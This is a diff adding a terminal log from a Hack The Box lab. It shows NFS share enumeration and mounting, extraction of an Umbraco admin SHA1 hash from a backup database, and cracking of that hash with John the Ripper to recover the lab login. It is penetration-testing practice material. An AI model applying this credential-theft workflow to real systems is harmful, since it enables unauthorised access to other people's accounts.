@@ -49,3 +49,93 @@ Host script results:
 
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 69.24 seconds
+allenwest1@debian:~/Desktop$ sudo showmount -e 10.10.10.180
+Export list for 10.10.10.180:
+/site_backups (everyone)
+allenwest1@debian:~/Desktop$ pwd
+/home/allenwest1/Desktop
+allenwest1@debian:~/Desktop$ mkdir HTBremote
+allenwest1@debian:~/Desktop$ cd HTBremote/
+allenwest1@debian:~/Desktop/HTBremote$ mount -t nfs 10.10.10.180:/site_backups /home/allenwest1/Desktop/
+mount: only root can use "--types" option
+allenwest1@debian:~/Desktop/HTBremote$ sudo mount -t nfs 10.10.10.180:/site_backups /home/allenwest1/Desktop/HTBremote/
+allenwest1@debian:~/Desktop/HTBremote$ ls
+allenwest1@debian:~/Desktop/HTBremote$ sudo mount -t nfs 10.10.10.180:/site_backups /home/allenwest1/Desktop/HTBremote/
+allenwest1@debian:~/Desktop/HTBremote$ ls
+allenwest1@debian:~/Desktop/HTBremote$ ls -al
+total 8
+drwxr-xr-x  2 allenwest1 allenwest1 4096 Jul 12 12:55 .
+drwxr-xr-x 12 allenwest1 allenwest1 4096 Jul 12 12:55 ..
+allenwest1@debian:~/Desktop/HTBremote$ cd ..
+allenwest1@debian:~/Desktop$ cd HTBremote/
+allenwest1@debian:~/Desktop/HTBremote$ ls
+App_Browsers  aspnet_client  css           Media    Umbraco_Client
+App_Data      bin            default.aspx  scripts  Views
+App_Plugins   Config         Global.asax   Umbraco  Web.config
+allenwest1@debian:~/Desktop/HTBremote$ cd App_Data/
+allenwest1@debian:~/Desktop/HTBremote/App_Data$ ls
+cache  Logs  Models  packages  TEMP  umbraco.config  Umbraco.sdf
+allenwest1@debian:~/Desktop/HTBremote/App_Data$ strings Umbraco.sdf | grep admin
+Administratoradmindefaulten-US
+Administratoradmindefaulten-USb22924d5-57de-468e-9df4-0961cf6aa30d
+Administratoradminb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}en-USf8512f97-cab1-4a4b-a49f-0a2054c47a1d
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-USfeb1a998-d3bf-406a-b30b-e269d7abdf50
+adminadmin@htb.localb8be16afba8c314ad33d812f22a04991b90e2aaa{"hashAlgorithm":"SHA1"}admin@htb.localen-US82756c26-4321-4d27-b429-1b5c7c4f882f
+User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/password/changepassword change
+User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
+User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
+User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
+User "admin" <admin@htb.local>192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/logoutlogout success
+User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/saveupdating LastLoginDate, LastPasswordChangeDate, UpdateDate
+User "SYSTEM" 192.168.195.1User "admin" <admin@htb.local>umbraco/user/sign-in/loginlogin success
+.
+.
+.
+// admin password SHA1 encrypted: b8be16afba8c314ad33d812f22a04991b90e2aaa
+.
+.
+.
+allenwest1@debian:~/Desktop/HTBremote/App_Data$ sudo john
+John the Ripper password cracker, version 1.8.0                         
+Copyright (c) 1996-2013 by Solar Designer
+Homepage: http://www.openwall.com/john/
+
+Usage: john [OPTIONS] [PASSWORD-FILES]
+--single                   "single crack" mode
+--wordlist=FILE --stdin    wordlist mode, read words from FILE or stdin
+--rules                    enable word mangling rules for wordlist mode
+--incremental[=MODE]       "incremental" mode [using section MODE]
+--external=MODE            external mode or word filter
+--stdout[=LENGTH]          just output candidate passwords [cut at LENGTH]
+--restore[=NAME]           restore an interrupted session [called NAME]
+--session=NAME             give a new session the NAME
+--status[=NAME]            print status of a session [called NAME]
+--make-charset=FILE        make a charset, FILE will be overwritten
+--show                     show cracked passwords
+--test[=TIME]              run tests and benchmarks for TIME seconds each
+--users=[-]LOGIN|UID[,..]  [do not] load this (these) user(s) only
+--groups=[-]GID[,..]       load users [not] of this (these) group(s) only
+--shells=[-]SHELL[,..]     load users with[out] this (these) shell(s) only
+--salts=[-]N               load salts with[out] at least N passwords only
+--save-memory=LEVEL        enable memory saving, at LEVEL 1..3
+--node=MIN[-MAX]/TOTAL     this node's number range out of TOTAL count
+--fork=N                   fork N processes
+--format=NAME              force hash type NAME: descrypt/bsdicrypt/md5crypt/
+                           bcrypt/LM/AFS/tripcode/dummy/crypt
+allenwest1@debian:~/Desktop/HTBremote/App_Data$ cd 
+allenwest1@debian:~$ cd Desktop
+allenwest1@debian:~/Desktop$ vim pass.txt
+allenwest1@debian:~/Desktop$ cd HTBremote/
+allenwest1@debian:~/Desktop/HTBremote$ cd App_
+bash: cd: App_: No such file or directory
+allenwest1@debian:~/Desktop/HTBremote$ cd App_Data/
+allenwest1@debian:~/Desktop/HTBremote/App_Data$ sudo john -wordlist=~/Desktop/rockyou.txt ~/Desktop/pass.txt 
+.
+.
+.
+// admin@htb.local:baconandcheese
+// logged into the website
+.
+.
+.
+
